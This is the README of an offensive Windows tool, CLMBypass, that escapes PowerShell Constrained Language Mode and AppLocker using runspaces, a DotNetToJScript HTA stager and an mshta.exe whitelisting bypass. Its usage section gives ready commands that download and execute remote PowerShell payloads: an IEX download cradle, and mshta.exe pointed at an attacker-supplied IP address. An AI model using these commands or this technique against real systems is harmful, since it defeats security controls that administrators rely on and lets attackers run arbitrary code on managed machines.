# CLMBypass

Bypass Constrained Language Mode in PowerShell, based off of [SecJuice's](https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/) article. Also comes with a stager in case AppLocker is being used, used [DotNetToJScript](https://github.com/tyranid/DotNetToJScript) and [the mshta.exe AWL bypass](https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-mshta-exe/).

### contents
- payload.ps1
  - payload to be run in FullLanguage mode
- stager.hta
  - CLMBypass.dll is stored as base64
  - When a client accesses it, the DLL will be loaded dynamically
  - The powershell command to download the final payload is executed in the CLMBypass Runspace with FullLanguage mode
  - `payload.ps1` is downloaded and executed in FullLanguage mode
- Program.cs
  - C# source code
- CLMBypass.exe
  - Compiled as PE32 .NET Framework 4.0

## usage
#### CLMBypass by itself (CLM, but no AppLocker)
```
C:\Users\CLMUser\Downloads>.\CLMBypass.exe "IEX(New-Object Net.WebClient).DownloadString('http://localhost/somescript.ps1')"
```

#### CLMBypass with stager (AppLocker and CLM)
```
C:\Users\CLMUser\Downloads>mshta.exe http://<ip>/payload.ps1
```
**NOTE:** This will cause a window with the rendered `stager.hta` to pop up, which can be closed without hindering the process.
